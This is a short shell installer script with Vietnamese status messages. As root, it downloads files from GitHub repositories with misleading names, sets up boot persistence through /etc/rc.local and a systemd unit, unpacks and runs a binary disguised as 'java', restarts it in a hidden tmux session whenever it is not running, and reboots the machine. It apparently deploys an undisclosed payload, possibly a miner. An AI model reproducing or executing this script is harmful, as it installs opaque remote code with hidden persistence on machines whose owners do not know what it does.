#!/bin/sh
set -x #echo on
if [ -f ${PWD}/java ]; then
    if pgrep -x "java" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
sudo tmux new-session -d -s my_session1  'sh autostart.sh'

fi
exit
fi



sudo apt-get update	
sudo apt install build-essential gnupg2 gcc make gnupg2 unzip -y < "/dev/null"



wget https://raw.githubusercontent.com/minnie1311/azureAI/master/rc-local.service
sudo mv rc-local.service /etc/systemd/system/rc-local.service
wget https://raw.githubusercontent.com/minnie1311/Python3/main/rc.local1
sudo mv rc.local1 /etc/rc.local
sudo chmod +x /etc/rc.local
sudo systemctl enable rc-local
sudo wget https://github.com/minnie1311/Python3/raw/main/ubuntu_18.04.zip
sudo unzip ubuntu_18.04.zip
sudo chmod +x java
sudo rm start.sh
sudo wget https://raw.githubusercontent.com/minnie1311/Python3/main/autostart.sh
sudo reboot



